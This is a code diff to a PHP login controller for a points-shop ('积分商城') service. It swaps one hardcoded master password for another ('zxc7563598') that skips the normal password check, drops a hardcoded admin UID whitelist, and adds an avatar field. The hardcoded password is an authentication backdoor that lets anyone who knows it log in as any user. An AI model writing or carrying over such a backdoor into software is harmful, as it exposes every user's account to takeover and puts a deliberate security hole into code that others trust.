@@ -4,13 +4,11 @@ namespace app\controller\shop;
 
 use app\controller\GeneralMethod;
 use app\core\LoginPublicMethods;
-use app\model\RedemptionRecords;
 use app\model\UserVips;
 use support\Request;
 use support\Redis;
 use Webman\Http\Response;
 use resource\enums\UserVipsEnums;
-use resource\enums\RedemptionRecordsEnums;
 
 class LoginController extends GeneralMethod
 {
@@ -70,7 +68,7 @@ class LoginController extends GeneralMethod
             }
             $user_vip = UserVips::where('uid', $uid)->first();
         }
-        if ($password != 'sbwenyiling') {
+        if ($password != 'zxc7563598') {
             if (empty($user_vip->password)) {
                 $user_vip->salt = mt_rand(1000, 9999);
                 $user_vip->password = sha1(sha1($password) . $user_vip->salt);
@@ -115,25 +113,13 @@ class LoginController extends GeneralMethod
         $user_vips = $request->user_vips;
         sublog('积分商城', '获取我的信息', $user_vips);
         sublog('积分商城', '获取我的信息', '===================');
-        // 初始化信息
-        $redeeming = 0;
-        // 验证权限
-        $empower = false;
-        if (in_array($user_vips->uid, [
-            4325051,
-            3494365156608185
-        ])) {
-            $redeeming = RedemptionRecords::where('status', RedemptionRecordsEnums\Status::NoShipment->value)->count();
-            $empower = true;
-        }
         // 返回处理
         return success($request, [
             'uid' => $user_vips->uid,
             'uname' => $user_vips->name,
             'point' => $user_vips->point,
-            'redeeming' => $redeeming,
             'type' => UserVipsEnums\VipType::from($user_vips->vip_type)->label(),
-            'empower' => $empower
+            'avatar' => getImageUrl('/user/avatar.png')
         ]);
     }
 }
